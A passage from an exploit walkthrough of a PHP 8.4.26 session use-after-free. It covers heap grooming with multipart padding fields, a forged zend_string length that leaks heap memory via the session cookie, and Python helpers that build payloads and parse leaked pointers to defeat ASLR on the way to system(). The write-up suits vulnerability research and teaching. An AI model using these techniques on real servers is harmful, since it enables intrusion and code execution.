Bins and Freelists To understand why 51, we first need to understand how the Zend memory allocator organizes freed memory. The allocator doesn't just throw all freed memory into one messy pile. It organizes freed chunks into different linked lists (called bins or freelists) strictly based on their size. The allocator has a bin for 8-byte chunks, a bin for 16-byte chunks, a bin for 32-byte chunks and so on ,around 30 bins in total, each for a specific size class. Allocator's Internal Freelists (Bins): Bin 0 ( 8B) → NULL Bin 1 ( 16B) → NULL Bin 2 ( 24B) → NULL Bin 3 ( 32B) → [ 0xAABB0040 ] → [ 0xAABB0060 ] → [ 0xAABB0080 ] →NULL ... Bin 7 ( 64B) → [ 0xAABB0100 ] → NULL Bin 8 ( 80B) → NULL ... Bin 10 (112B) → NULL ... Bin 12 (160B) → NULL ... Bin 29 (3072B) → NULL So when you want to allocate 48 bytes, the allocator checks the 48-byte bin and says "You need 48 bytes? Perfect, I have a 48-byte chunk right here." And it gets allocated in the place of the old freed chunk. When you free a 48-byte chunk, it goes back to that bin and waits to be claimed by another allocation. OK?? Think about our stale pointer. It was freed right?? So that memory is sitting inside the corresponding bin of its size. It was a zend_string holding a session ID of about 32 characters. As we saw in the zend_string struct above, every string has a 24-byte header (gc + hash + len) plus the string content plus a NUL terminator: zend_string size = 24 + strlen + 1 For the stale pointer with ~32 chars: 24 + 32 + 1 = 57 bytes → rounded up to 64B → Bin 7 So the stale pointer's freed memory is sitting in bin 7's freelist (64-byte slots). > OOM trigger. GDB showing _zend_bailout() with PS(id) = 0x7f08e1874000, len = 32, session ID "ef96dda6055f931c8bed60759585442a" : the pointer is still valid, sitting at chunk 0x7f08e1800000, page 116. The Wilderness Now what happens when a bin is empty for a specific size? Let's say we call emalloc(80) but there's no 80-byte chunk available in bin 8. The allocator goes and grabs more space from the Wilderness. What is the Wilderness? In the beginning, the allocator grabs a huge memory chunk for the entire heap in PHP, that's a 2 MiB (2,097,152 bytes) aligned block. But it doesn't use it all at once. It divides the chunk into 512 pages of 4,096 bytes each. Only a few pages are used initially, the rest sit untouched at the end of the chunk as the Wilderness. Just some free space, not needed yet. When a bin's freelist is empty, the allocator carves a fresh page from the Wilderness and slices it into slots of that bin's size. Pages are claimed sequentially, one by one, advancing the "frontier" from page 1 toward page 511. Here's the full picture: 2 MiB Chunk (512 pages) ┌──────────────────────────────────────────────────────────┐ │ Page 0 : Chunk header + metadata │ │ Page 1 : Bin 3 slots (32B × 128 per page) │ │ Page 2 : Bin 8 slots (80B × 51 per page) │ │ Page 3 : Bin 8 slots (continued) │ │ ... ... more pages claimed by various bins ... │ │ Page 116 : ← STALE POINTER WAS HERE │ │ ... │ │ Page N : ═══ WILDERNESS FRONTIER ═══ │ │ Page N+1 : Wilderness (untouched) │ │ ... │ │ Page 511 : Wilderness (untouched) │ | Note: N in the start is lower than 116 i will explain | | this later | └──────────────────────────────────────────────────────────┘ Why Direct Replacement Doesn't Work Now here's the thing that trips everyone up. You might be thinking: "Why can't we just send the forged data with the exact same size as the stale pointer? It would go into bin 7 (64 bytes), the allocator would pop the stale pointer's old slot from the freelist, and our forged data lands right there. Done!" Here's the problem. When Request #1 crashes (OOM → bailout → longjmp()), PHP calls zend_mm_shutdown() which frees the entire chunk. Everything gets reset — all bins are emptied, all freelists cleared, the Wilderness frontier goes back to the beginning. It's like the whole 2 MiB block is wiped clean. > Phase 2: GDB showing zend_mm_shutdown() PS(id) still = 0x7f08e1874000, memory still contains the session ID bytes, but after this function returns the entire heap is freed and PS(id) becomes a dangling pointer. But here's what doesn't change: the physical memory at those addresses still exists, and the OS gives the same 2 MiB block right back to Request #2. The stale pointer is still pointing at the same address deep inside the chunk, at page 116 (in my GDB run, that was address 0x7f08e1874000). So when Request #2 starts, the allocator is fresh. All bins start from scratch, claiming new pages from the Wilderness starting at the bottom. If we just send one 64-byte allocation, bin 7 grabs first available pages for example it may be 8 or 9, slices it into 64-byte slots, and gives us a slot there. That's nowhere near page 116 ... and as we can see in the screenshot our pointer is on page 116. You see?? This is exactly why we can't send the forged data directly, the memory area our allocator is using hasn't even reached that place yet. And... our forged data needs to end up in a bin 8 slot to land at PS(id). We will see exactly how later. What the 51 Fields Actually Do: Page Consumption So what do we do?? We need to consume pages until the frontier advances past page 116. That's what the 51 padding fields are really doing. None of the 51 padding fields go into bin 7. Let me show you: Each of the 51 padding fields allocates TWO zend_strings: KEY ("1000"..."1050") = 4 character string └→ zend_string: 24 + 4 + 1 = 29 bytes → rounded to 32B → BIN 3 VALUE (48 bytes of data) └→ zend_string: 24 + 48 + 1 = 73 bytes → rounded to 80B → BIN 8 Bin 3 and bin 8. NOT bin 7. The keys go into bin 3 (32B), the values go into bin 8 (80B). They're not directly replacing the stale pointer in bin 7 at all! What they're actually doing is consuming pages across multiple bins, advancing the Wilderness frontier forward through the chunk. So why exactly 51? Because bin 8 keeps consuming pages from the Wilderness as we send more fields. Each bin 8 page holds 51 slots (4096 ÷ 80 = 51, with 16 bytes wasted at the end). As bin 8's freelist runs dry, the allocator carves fresh pages advancing the frontier deeper and deeper into the chunk. Combined with the bin 3 key allocations, plus all the internal PHP allocations (class tables, function tables, built in strings, content disposition headers, all consuming their own pages before and alongside our fields), the frontier creeps forward page by page. At the same time, the $_POST HashTable backing array is growing alongside all of this: Entries HashTable Capacity What Happens ───────────────────────────────────────────────────────────── 0 → 8 8 slots Initial arData: 320B allocated 9 → 16 16 slots Resize! New arData: 640B (old 320B freed) 17 → 32 32 slots Resize! New arData: 1280B (old 640B freed) 33 → 64 64 slots Resize! New arData: 2560B (old 1280B freed) 51 still 64 slots No resize needed at this count (51/64) Each resize allocates a bigger arData array and frees the old one, each landing in its own bin, eating even more Wilderness pages on top of the bin 3 and bin 8 allocations. It all adds up: keys in bin 3, values in bin 8, HashTable arData arrays in their own bins, internal PHP allocations... all pushing the frontier forward page after page. 51 padding fields is exactly the number that pushes bin 8's page frontier to page 116 (the page where the stale pointer lives). Now here comes the part that blew my mind when I first saw it in the memory dumps. Look at what's sitting at stale pointer position after all 51 fields are parsed: After 51 padding fields memory at PS(id) (page 116): PS(id)+0x00: 01 00 00 00 16 00 00 00 ← gc (refcount=1, type=string) PS(id)+0x08: 00 00 00 00 00 00 00 00 ← hash (not computed yet) PS(id)+0x10: 30 00 00 00 00 00 00 00 ← len = 0x30 = 48 bytes PS(id)+0x18: 76 30 30 35 30 78 78 78 ← val[] = "v0050xxx..." PS(id)+0x20: 78 78 78 78 78 78 78 78 ← "xxxxxxxx" PS(id)+0x28: 78 78 78 78 78 78 78 78 ← "xxxxxxxx" PS(id)+0x30: 78 78 78 78 78 78 78 78 ← "xxxxxxxx" See that?? That's the value of key "1050" the LAST padding field , its zend_string starts right at PS(id), slot 0 on page 116. The gc header is at PS(id)+0x00, and val[] begins at PS(id)+0x18. Bin 8 kept claiming page after page from the Wilderness as we sent more and more fields, advancing the frontier deeper into the chunk. By the time we hit the 51st field, bin 8 reached page 116, and the last value landed at exactly this address. This isn't a coincidence, this is the entire point of the 51 fields. We needed the frontier to advance far enough to put a bin 8 slot right where the stale pointer is. And now that it's here, we're going to free it. One more thing you'll notice if you look at the raw dumps, each padding value actually appears twice in memory one right next to the other one. Why?? Because PHP's multipart parser creates multiple heap allocations for each field value. There's a temporary buffer where the raw bytes are first read from the HTTP body, and then safe_php_register_variable() calls ZVAL_STRINGL() which allocates a brand new zend_string by copying the bytes for the $_POST entry. For our 48 byte padding values, that zend_string copy is 24+48+1=73 bytes rounded to 80 bytes, which is bin 8. The temporary buffer gets freed but ZendMM doesn't zero freed memory, so the bytes stick around. That's why you see duplicate copies of "v0045", "v0046", etc. in the dumps. The exact nature of that temporary buffer and what bin it falls into will become VERY important later when we try to understand how the forged data reaches PS(id). For now, just remember: each field value gets copied more than once during parsing, and the zend_string copy (bin 8, 80B) is the one that matters for page consumption. The Repeated Key 1050: Freeing the Slot at PS(id) After the 51 padding fields, the exploit sends key "1050" again but this time with a much larger value: 128 bytes of 'Z'. Since "1050" already exists in the $_POST array, PHP updates the existing entry rather than adding a new one. The old value gets freed, and a new, bigger value is allocated: Old value of key 1050: 48 bytes → zend_string: 73B → Bin 8 (80B) → FREED New value (128 × 'Z'): 128 bytes → zend_string: 153B → Bin 12 (160B) → ALLOCATED Now here's what makes this step so critical, the old value being freed isn't just some random bin 8 slot somewhere in the heap. It's the one sitting at PS(id). That exact "v0050xxx..." we just saw in the memory dump. When PHP frees it, the allocator stomps the first 8 bytes of the freed slot with a freelist pointer linking it to the next free slot in bin 8's freelist. Everything past those first 8 bytes survives untouched. You can see the aftermath in the dump: After resize — memory at PS(id) (page 116): PS(id)+0x00: a0 3f e7 47 fe 7e 00 00 ← FREELIST POINTER (gc stomped!) PS(id)+0x08: 00 00 00 00 00 00 00 00 ← old hash — untouched PS(id)+0x10: 30 00 00 00 00 00 00 00 ← old len=48 — untouched PS(id)+0x18: 76 30 30 35 30 78 78 78 ← old val[] "v0050xxx" — untouched And here's the key insight: the page stays as bin 8. The slot at PS(id) goes back onto the bin 8 freelist, waiting for the next bin 8 allocation to pop it. The page itself doesn't change its bin assignment just because one slot was freed. This is important because the forged data will land in this exact same bin 8 slot. The new 128 byte Z value goes into bin 12 (160B), which goes to another page nowhere near page 116. That's why we don't see where the Z bytes went... you won't find them anywhere in the dumps. Not a single 0x5A in the entire 8 KB window around PS(id). The Z data landed on a completely different page. Its only job was to free the slot at PS(id) by replacing the old value. The slot is freed. The trap is set. The Forged Value Lands (And the Mystery That Almost Broke my mind) Finally, field "1999" arrives with the 79 byte forged payload. And this is where I genuinely started losing my mind. See, the math doesn't add up at first. The forged value is 79 bytes. If you calculate the zend_string size for the $_POST copy: 24+79+1 = 104 bytes, rounded up = 104 bytes = bin 10 (112B). Not bin 8. The smart_string buffer that the parser uses to accumulate bytes?? That's 256 bytes = bin 15. Also not bin 8. So where does the bin 8 allocation come from?? The place where PS(id) is pointing is a bin 8 page, made bin 8 by our own field 1050. And no matter how hard I tried tracking our forged data through the code, it always ended up on bin 10 on some completely different page nowhere near PS(id). Then I noticed something. If you look at the raw memory dumps, every field value appears twice in memory. Once in the smart_string buffer (bin 15) and once as the zend_string copy in $_POST (bin 8 for padding, bin 10 for forged). So I thought... maybe there's a THIRD copy somewhere?? Maybe somewhere in the process PHP puts the data in a bin 8 allocation before it reaches the final zend_string copy on bin 10. Some intermediate step that I couldn't see. And it was impossible to spot in the release build. I tried everything: _emalloc breakpoints: release builds inline emalloc() into the caller's machine code, so there's no function call for GDB to break on. I traced 464 _emalloc calls and none returned PS(id)'s address memcpy breakpoints: the compiler inlines small memcpy operations as direct mov instructions. My breakpoint caught the PADDING value copy but completely missed the forged value copy Hardware watchpoints: I set a watchpoint on PS(id)+0x08 waiting for 0x4141414141414141 to appear. It fired once, confirmed the write happened inside rfc1867_post_handler, but the backtrace was just one frame deep with no source lines (release build, no debug symbols) Conditional watchpoints on len=256: timed out every time because the watchpoint fires on every single write to that address during the entire request Nothing worked. I could SEE the forged data in the dumps, I could PROVE it was there, but I couldn't figure out WHAT put it there. So I built a debug version of PHP 8.4.26 from source with --enable-debug. Debug builds keep emalloc() as a real function call, keep memcpy() as a real function call, and most importantly have full debug symbols so backtraces show you the actual file and line number. The catch is that debug builds add overhead to every allocation (guard bytes, canaries, tracking headers) which changes the sizes and bin assignments, so the exploit doesn't groom the same way and the forged data doesn't actually reach PS(id). But that's fine because I didn't need the exploit to work, I just needed to READ THE SOURCE CODE that the debug build gave me access to. And there it was. Hiding in plain sight. multipart_buffer_read_body() in main/rfc1867.c line 632: static char *multipart_buffer_read_body(multipart_buffer *self, size_t *len) { char buf[FILLUNIT], *out=NULL; size_t total_bytes=0, read_bytes=0; while((read_bytes = multipart_buffer_read(self, buf, sizeof(buf), NULL))) { out = erealloc(out, total_bytes + read_bytes + 1); // <── THIS IS IT memcpy(out + total_bytes, buf, read_bytes); // <── AND THIS total_bytes += read_bytes; } if (out) { out[total_bytes] = '\0'; } *len = total_bytes; return out; } THIS is the function that reads each field's raw value from the HTTP body. Not smart_string. Not ZVAL_STRINGL. Just a plain erealloc loop that builds a char* buffer. And for our 79 byte forged value, the math is beautiful: erealloc(NULL, 0 + 79 + 1) = emalloc(80) └── 80 bytes = EXACTLY bin 8 79 bytes of forged data + 1 null terminator = 80 bytes = bin 8. EXACTLY bin 8. Not bin 10, not bin 15. The raw body reader allocates a temporary buffer that is the EXACT size of a bin 8 slot. The mystery was solved. Here's the full sequence of what happens when field "1999" is processed: multipart_buffer_read_body() reads the 79 forged bytes from the HTTP body erealloc(NULL, 80) → emalloc(80) → pops the freed slot at PS(id) from the bin 8 freelist memcpy(out, buf, 79) copies all 79 forged bytes into PS(id), including len=256 at +0x10 and val[0]='L' at +0x18 The function returns value = PS(id) back to rfc1867_post_handler safe_php_register_variable(param, value, ...) at line 887 copies the bytes into a zend_string for $_POST (bin 10, different page, we don't care about this one) efree(value) at line 910 frees the bin 8 slot at PS(id), freelist stomps +0x00 and +0x48 The forged bytes at +0x08 through +0x47 survive And the reason this was invisible in the release build?? In optimized builds, the compiler inlines erealloc(NULL, 80) into direct bin 8 freelist pointer manipulation (a few mov instructions, no function call) and inlines memcpy(out, buf, 79) into a series of rep movsb or register moves. There is literally no function boundary for GDB to break on. The allocation and the copy are just anonymous instructions buried in the middle of a 1588 line disassembly of rfc1867_post_handler. That's why the _emalloc breakpoint missed it (never called as a function), the memcpy breakpoint missed it (never called as a function), and only the hardware watchpoint caught the RESULT but couldn't tell us WHERE in the code it came from. So there you go. The forged data reaches PS(id) not through smart_string, not through ZVAL_STRINGL, but through the simplest possible code path: a temporary erealloc buffer in the raw multipart body reader. 79+1 = 80 = bin 8. Perfect fit. Here's what matters: the 79 forged bytes overwrite the entire bin 8 slot at PS(id). Remember that PS(id) is a zend_string*, so PHP interprets the memory at PS(id) as a zend_string struct: Forged data overwrites the zend_string at PS(id): PS(id) │ ▼ ┌──────────────────┬──────────────────┬───────────┬─────────────────────┐ │ gc (8B) │ hash (8B) │ len (8B) │ val[] │ │ +0x00 │ +0x08 │ +0x10 │ +0x18 │ └──────────────────┴──────────────────┴─────┬─────┴──────┬──────────────┘ │ forged[0x00] │ forged[0x08] │forged[0x10]│ forged[0x18] │ │ = A*8 │ = A*8 │ = 256 │ = 'L' + A*7 │ └──────────────────┴──────────────────┴────────────┴────────────────────┘ Our forged[0x10] = 256 lands right at the len field. Our forged[0x18] = 'L' lands right at val[0]. The forged bytes are designed so the offsets within the 79 byte payload match the zend_string struct layout. Then the slot gets freed. When ZendMM frees a bin 8 slot (80 bytes), it writes two things: A freelist pointer at the first 8 bytes (PS(id)+0x00) An XOR validation value at the last 8 bytes (PS(id)+0x48, which is offset 72 = 80 minus 8) Everything between those two zones survives. and we can check that in the dumps: After forging : memory at PS(id): PS(id)+0x00: a0 3f 87 e1 08 7f 00 00 ← FREELIST POINTER (0x00007f08e1873fa0) PS(id)+0x08: 41 41 41 41 41 41 41 41 ← forged[0x08] = "AAAAAAAA" — survived PS(id)+0x10: 00 01 00 00 00 00 00 00 ← forged[0x10] = 256 (LE) — SURVIVED PS(id)+0x18: 4c 41 41 41 41 41 41 41 ← forged[0x18] = 'L' + "AAAAAAA" — SURVIVED ... PS(id)+0x48: 45 a1 fb ea a3 b1 8c a2 ← XOR VALIDATION (0xa28cb1a3eafba145) *(Note on the bytes: If you look at the debugger pointers in parentheses and wonder why our byte map looks backward. x86_64 processors use little-endian architecture, meaning the least significant byte is stored at the lowest memory address. We are mapping the memory exactly as it sits in RAM because this is exactly how you have to pack the bytes in your exploit payload.)* The first 8 bytes and last 8 bytes got stomped but who cares?? Our critical data is at forged[0x10] (the len field) and forged[0x18] (the first byte of val[]). Both are safely in the middle of the 80 byte slot, well past both danger zones. They survived untouched. Now remember PS(id) is a zend_string*. When PHP serializes the session, it reads: ZSTR_LEN(PS(id)) = (uint64_t)(PS(id) + 0x10) = 256 instead of the original 32 ZSTR_VAL(PS(id)) = (char*)(PS(id) + 0x18) = "LAAA..." So PHP happily reads 256 bytes starting from val[], scooping up neighboring heap data pointers, struct headers, everything and sends it all back in the Set-Cookie header. THAT is the heap leak. The Parking Garage Analogy (to understand better) Imagine a parking garage with 512 floors. The stale pointer is parked on floor 116. After the building is "reset" (all floors unmarked), different vehicle types (bins) start claiming floors from the bottom: Compact cars (bin 3, 32B) take some floors SUVs (bin 8, 80B) take other floors Minivans (HashTable arData arrays) take even more floors You keep sending SUVs until they claim floor 116 and one parks right at the stale pointer's spot. Then you tell that SUV to leave (the resize frees its slot). The floor stays marked as "SUV parking" (bin 8) but that specific spot is now empty and back on the waiting list. Then during the processing of the forged field, multipart_buffer_read_body() needs a temporary buffer of exactly 80 bytes (79 forged bytes + 1 null terminator), which is exactly SUV sized. It grabs that same spot from the waiting list, fills it with your forged data, then leaves again when efree(value) is called. The spot goes back to the waiting list with a "next in line" tag stamped over the first 8 bytes, but the forged data you wrote in the middle of the spot is still sitting there untouched. When the stale pointer comes back to check its old spot?? It reads your forged data. Here's the full lifecycle of the page at PS(id). The page changes bin assignment once (from 7 to 8 during the shutdown/startup cycle), and then stays bin 8 for the rest of the exploit: Step 0: Page = Bin 7 (64B) original session ID zend_string lives here ↓ ↓ OOM → zend_mm_shutdown() ,entire chunk freed, all bins reset ↓ Step 1: Page = Bin 8 (80B) consumer grooming: padding value "v0050xxx..." lands at PS(id) ↓ ↓ resize frees the padding value → slot returns to bin 8 freelist ↓ Step 2: Page = Bin 8 (80B) , slot at PS(id) is freed, old data persists at +0x08+ ↓ ↓ multipart_buffer_read_body() does erealloc(NULL, 79+1) = emalloc(80) = bin 8! ↓ pops PS(id) from freelist, memcpy writes 79 forged bytes, efree puts it back ↓ Step 3: Page = Bin 8 (80B) ,slot freed again: freelist ptr stomps +0x00 and +0x48 but forged[0x08:0x48] survives, including len=256 and val[0]='L' Back to the Swiss Cheese Remember the "Swiss Cheese" heap grooming from earlier? I gave it that name so it sticks in your head until I bring it back. Well, here we are. Now that you understand pages, bins, the Wilderness frontier, and how the allocator actually moves through memory, let's see what those 50 padding fields (p0000 to p0049) actually do. I ran the exploit with and without those padding fields and dumped 8 KB of memory centered on PS(id): ┌─────────────────────────────────────────────────────────────────────────┐ │ WITH PADDING (50 fields) │ │─────────────────────────────────────────────────────────────────────────│ │ │ │ Stage 0 OOM Bailout: │ │ PS(id) = 0x7fa699a73000 │ │ page 115, bin 7 (64B slots), slot 0 │ │ len = 32, val = "86df57f9eb2ab3ff802ac3836eaedcfa" │ │ → Valid session ID, sitting in a fresh bin 7 Wilderness page. │ │ │ │ Stage 1 After zend_mm_shutdown: │ │ Same address, page now "free-or-unknown" │ │ → Heap is freed. Memory still holds old data. Pointer is dangling. │ │ │ │ Stage 2 Consumer grooming applied: │ │ len = 256, val[0] = 'L' (0x4C) │ │ page 115, bin 8 (80B) — SAME page, reclaimed by bin 8 │ │ → The forged zend_string landed EXACTLY at PS(id). Exploit succeeds. │ │ → Cookie: 256 bytes of raw heap memory leaked. │ │ │ ├─────────────────────────────────────────────────────────────────────────┤ │ WITHOUT PADDING (0 fields) │ │─────────────────────────────────────────────────────────────────────────│ │ │ │ Stage 0 OOM Bailout: │ │ PS(id) = 0x7fbcc1868000 │ │ page 104, bin 7 (64B slots), slot 0 │ │ len = 32, val = "0b636a920199064b0a5b0dd44a67b335" │ │ → Session ID on a recycled freelist page, not Wilderness. │ │ │ │ Stage 1 After zend_mm_shutdown: │ │ Same. Heap freed. │ │ │ │ Stage 2 Consumer grooming applied: │ │ len = 0xFFFFFFFFFFFFFFFF (garbage) │ │ val[0] = 0xFF (garbage) │ │ page 104, bin 20 (640B) reclaimed by wrong bin │ │ → Consumer's grooming landed on COMPLETELY DIFFERENT pages. │ │ → Nothing reached PS(id). No cookie. Exploit fails. │ │ │ └─────────────────────────────────────────────────────────────────────────┘ See the difference? Without the padding, PS(id) lands on page 104 right from the start. When we try to leak data from that unpredictable spot, we end up reading 256 bytes of useless garbage instead of targetable memory, and the exploit fails. By executing those 50 padding fields, we intentionally push the starting location of the PS(id) pointer into a specific zone where our leak will capture useful pointers. This padding achieves two mandatory goals: It pushes PS(id) into a known, predictable location so our consumer can reliably target and overwrite it. It places PS(id) in a neighborhood where reading 256 bytes past it actually hits the valuable chunk pointers we need to bypass ASLR. > Why page 115 and not page 116? > If you noticed I mentioned page 116 earlier, don't panic. The exact starting page shifts slightly depending on PHP's startup allocations (like loaded extensions or interned strings). In this specific GDB run, it landed on 115; on another day with slightly different startup conditions, it might be 116. > The exploit still works flawlessly because it relies on relative distance. The producer and consumer run in the same process with the exact same startup state. If the startup allocations push the producer's PS(id) back by one page, the consumer's heap grooming is pushed back by the exact same amount. Because both sides shift together, the relative layout remains identical, and the forged payload lands right on target. But wait... that's TWO separate leaks, not one Before we move on, there is something incredibly important I need to clarify so it doesn't bite you later. When I said the attacker needs to leak both a heap pointer and a code pointer, I made it sound like they just scoop up both from a single request. In theory, yes, a massive over-read could contain both. But in practice? Getting the allocator to perfectly position both a heap chunk base and a PHP binary code pointer right next to our stale PS(id) at the exact same time is complicated. What makes it even more complicated is how the exploit verifies that the leaked memory isn't just random garbage. Remember, when we read past the end of the string, we just get a huge dump of raw bytes the script doesn't inherently know what any of it is. To trust a heap leak, we need consensus. The exploit sweeps a 256-byte chunk of memory and requires at least four different heap pointers to agree on the exact same Zend chunk base. One pointer could be a coincidence, two could be a mistake, but if four separate pointers all mathematically point to the same 2 MiB chunk base, we know it's real. But when it comes to the code pointer, we aren't looking for a dense cluster of pointers. We are hunting for one very specific needle in the haystack: the pDestructor field of an array struct. Specifically, we want it to point to a core PHP function called zval_ptr_dtor. We need this exact function because all the hardcoded offsets we use to find our final target (system()) are calculated relative to it and also it is used to redirect execution. To verify it isn't garbage, we don't need multiple pointers; we just check it against a specific signature that we studied on the php build (the lower 21 bits). We will see exactly how this works in the next section as usual. Because these two goals require completely different heap layouts,one a big region filled with multiple heap pointers versus a smaller, surgical strike on a specific pDestructor struct ,the actual exploit runs two completely separate leak stages, each with its own OOM producer and its own pipelined consumers. Stage 1-2 (heap): OOM producer → consumers → leaked 256-byte cookie → heap chunk base Stage 3 (code): OOM producer → consumers → leaked 16-byte cookie → zval_ptr_dtor address Each stage poisons a fresh worker (or reuses the same one if you're lucky), and each one uses a different OOM shape to leave the heap in a different state: # Heap leak producer shape: OOMShape(depth=57, count=950, field_count=50, field_value_size=1) # Code leak producer shape: OOMShape(depth=58, count=935, field_count=65, field_value_size=39) See the differences? The code leak uses deeper nesting (58 vs 57), fewer nested fields (935 vs 950), more padding fields (65 vs 50), and bigger padding values (39 bytes vs 1 byte). Every single one of those numbers changes how much memory gets consumed, which pages end up allocated, and most importantly where the stale pointer ends up sitting relative to what the consumer can reach, but in the end the logic is the same. Real practice: leaking the code pointer (Stage 3) We already went through the heap leak consumer in extreme detail. Now let's look at the code leak consumer, which has a completely different strategy (Stick with me to the end of this one, because the way we force the system to create this leak for us is absolutely brilliant): def code_reclaim() -> bytes: bnd = COOKIE_BOUNDARY fields = [mp_field(bnd, b"PHPSESSID", b"a"), mp_field(bnd, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")] # 73 simple string fields, each 24 bytes of "P"s for i in range(73): fields.append(mp_field(bnd, f"s{i:04d}".encode(), b"P" * 24)) # 910 more fields, most with a single element, # but field 69 creates a 16-element array for i in range(983 - 73): for j in range(16 if i == 69 else 1): fields.append(mp_field(bnd, f"a{i:04d}[{j}]".encode(), b"x" * 16)) return close_multipart(fields, bnd) Look at how different this is from the heap consumer. No 51 padding fields, no repeated key trick, no 79-byte forged payload. Instead we have: 73 string fields (s0000 through s0072), each with 24 bytes of data. These consume pages to push the frontier forward, same idea as the 51 fields before but with different sizes: KEY ("s0000"..."s0072") = 5-char string └→ zend_string: 24 + 5 + 1 = 30B → rounded to 32B → BIN 3 VALUE (24 bytes of 'P') └→ zend_string: 24 + 24 + 1 = 49B → rounded to 56B → BIN 6 Different bin from the heap consumer! These values go into bin 6 (56B) instead of bin 8 (80B), which means they consume pages at a different rate and land on different pages. 910 array fields (a0000 through a0909), each with a value of 16 bytes. But here's the magic: field number 69 doesn't create a single entry... it creates a 16-element array: a0069[0]=xxxx, a0069[1]=xxxx, a0069[2]=xxxx, ... a0069[15]=xxxx Why is that one field special?? Because when PHP creates a 16-element array, it allocates a zend_array (HashTable) struct to manage those 16 entries. And do you remember what a zend_array is? It is a struct that has the exact pDestructor field we are looking for! So we didn't just go digging into random memory hoping to find one ,we forced the system to create one for us. Now we need to trigger the leak and get that pointer back. At this point, if you understood the previous sections, you might be waiting to see us inject some forged data with a fabricated len field to trigger the over-read, right? But look at the code... there is no forged string. The trick we are pulling here is even smarter and honestly worth admiring,it explains why the expected cookie size is only 16 bytes. Doesn't that seem so small? We are literally just leaking the immediate neighbor of the PS(id) pointer. So hear me out: The zend_array we obliged the system to make holds the target pointer we want, right? But what else does it have? Let's look at the C code for it: struct _zend_array { zend_refcounted_h gc; /* +0x00 */ union { ... } u; /* +0x08 (flags and mask) */ Bucket *arData; /* +0x10 */ uint32_t nNumUsed; /* +0x18 */ uint32_t nNumOfElements; /* +0x1C */ uint32_t nTableSize; /* +0x20 <--- Look at this! */ uint32_t nInternalPointer; zend_long nNextFreeElement; /* +0x28 */ dtor_func_t pDestructor; /* +0x30 <--- Our target pointer */ }; You see the nTableSize? That is a number that tells PHP the capacity of the array. Since we forced it to make a 16-element array, nTableSize is exactly 16. So what is happening here is that all those 900+ fields we are sending are meticulously designed to manipulate the creation of this zend_array so it lands exactly where the stale PS(id) pointer is looking, but in a perfect, misaligned way. We position it so that the nTableSize field lands exactly where the len field of the zend_string would have been! When PHP reads that pointer, it looks for the string length, finds the nTableSize (which is 16), and says, "Ah, this string is 16 bytes long." It then happily reads the next 16 bytes of memory... which scoops up the pDestructor sitting right behind it. Mind-blowing, right? Basically, we trick PHP into creating a struct containing our target pointer, and then literally position it in a way where the struct itself is used to forge its own length and leak itself. Fingerprinting: how do we know we got the right pointer? OK so the attacker gets a 16-byte cookie back. How do they know it's actually zval_ptr_dtor (pDestructor) and not just random garbage? def parse_code_leak(cookie: bytes) -> int | None: if len(cookie) != 16 or struct.unpack_from("<Q", cookie)[0] != 16: return None value = struct.unpack_from("<Q", cookie, 8)[0] if CODE_MIN <= value < CODE_MAX and value & CHUNK_MASK == DTOR_LOW21: return value return None Three checks: Cookie must be exactly 16 bytes. normal PHPSESSID is 32 bytes. Getting exactly 16 proves that our misalignment worked and nTableSize successfully overwrote the len variable. First 8 bytes must equal 16. Remember how val[] maps to the array's nNextFreeElement field? In a 16-element array, nNextFreeElement is exactly 16. Checking this proves our misalignment was perfect down to the byte. The leaked pointer must match the fingerprint. This is the beautiful part. ASLR randomizes the base address of libphp.so, but it always shifts the entire binary as one block. That means the low 21 bits of any function's address never change between runs , they're fixed at compile time and baked into the ELF binary. For the Alpine PHP 8.4.26 build, zval_ptr_dtor always has 0x112930 as its low 21 bits: DTOR_LOW21 = 0x112930 So if the attacker gets a pointer like 0x7f3a12512930, they check: does 0x7f3a12512930 & 0x1FFFFF equal 0x112930? YES! now think about where we are: we are looking inside a zend_array struct right??, we know for a fact it has a pDestructor pointer, and the math perfectly matches the zval_ptr_dtor signature. That means this pointer is practically guaranteed to be the exact function we need. If the low bits don't match, it means either the cookie contains garbage OR the server is running a different PHP build. Either way, the script knows to stop right here instead of blindly sending a forged payload that will crash the worker. Parsing the heap leak: finding the chunk base in 256 bytes of chaos While we're talking about parsing leaked cookies, let's also look at how the heap stage validates its 256-byte cookie. Because 256 bytes of raw heap memory is NOT a clean, labeled structure. It's a mess of overlapping structs, old data, freelist pointers, and random garbage. How do you find a real heap pointer in all that noise? def parse_heap_leak(cookie: bytes) -> int | None: if len(cookie) != 256: return None candidates = [] for alignment in range(8): words = (struct.unpack_from("<Q", cookie, pos)[0] for pos in range(alignment, len(cookie) - 7, 8)) counts = collections.Counter(value & ~CHUNK_MASK for value in words if HEAP_MIN <= value < HEAP_MAX) if counts: base, hits = counts.most_common(1)[0] candidates.append((hits, alignment, base)) if not candidates: return None hits, _alignment, base = max(candidates) return base if hits >= MIN_POINTER_AGREEMENT else None The idea is clever: scan every possible 8-byte aligned position in the 256-byte blob. For each 8-byte value, check if it looks like a heap pointer (falls in the 0x700000000000 to 0x800000000000 range). Then mask off the low 21 bits (& ~0x1FFFFF) to get the chunk base. If multiple pointers in the blob all agree on the same chunk base (at least 4 of them MIN_POINTER_AGREEMENT), that's a real leak. Why? Because a single heap chunk is 2 MiB and all allocations within it share the same base. If 4+ different pointers in the leaked memory all point into the same 2 MiB chunk, there's basically no way that's a coincidence. Random ASCII bytes that accidentally look like valid pointers? Sure, one might slip through. But four of them all agreeing on the same aligned base? That's your real heap address. The 1+8 pipeline: how both leaks are actually delivered One more thing we need to cover before moving on. We talked about HTTP pipelining earlier as a way to solve the worker roulette problem. But I showed you the concept without showing the actual implementation. In reality, each leak stage sends nine HTTP requests in a single TCP write: ┌────────────────────────────────────────────────────────────────┐ │ TCP Connection (one sendall) │ │ │ │ Request 1: PRODUCER (OOM trigger) ← Connection: keep-alive│ │ Request 2: CONSUMER (leak attempt) ← Connection: keep-alive│ │ Request 3: CONSUMER (leak attempt) ← Connection: keep-alive│ │ Request 4: CONSUMER (leak attempt) ← Connection: keep-alive│ │ Request 5: CONSUMER (leak attempt) ← Connection: keep-alive│ │ Request 6: CONSUMER (leak attempt) ← Connection: keep-alive│ │ Request 7: CONSUMER (leak attempt) ← Connection: keep-alive│ │ Request 8: CONSUMER (leak attempt) ← Connection: keep-alive│ │ Request 9: CONSUMER (leak attempt) ← Connection: close │ │ │ └────────────────────────────────────────────────────────────────┘ All nine requests are written to the socket before reading any responses. This is critical. If the attacker waited for the producer's response before sending consumers, there's a window where another user's request could steal the 